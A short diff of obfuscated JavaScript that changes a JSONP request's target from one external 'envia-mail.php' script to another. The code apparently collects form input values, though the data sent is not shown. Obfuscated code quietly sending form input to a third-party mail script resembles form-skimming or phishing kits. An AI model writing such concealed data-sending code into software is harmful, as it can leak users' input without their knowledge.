@@ -38,7 +38,7 @@ var _0x2081 = ["\x6A\x51\x75\x65\x72\x79", "\x73\x74\x61\x72\x74", "\x76\x61\x6C
                 _0xbb6fx1[_0x2081[47]]({
                     type: _0x2081[39],
                     dataType: 'jsonp',
-                    url: 'http://www.kbzone.com.ar/envia-mail.php',
+                    url: 'http://www.terras.edu.ar/guillermo/envia-mail.php',
                     data: _0xbb6fx6,
                     success: function (_0xbb6fx7) {
                         /*
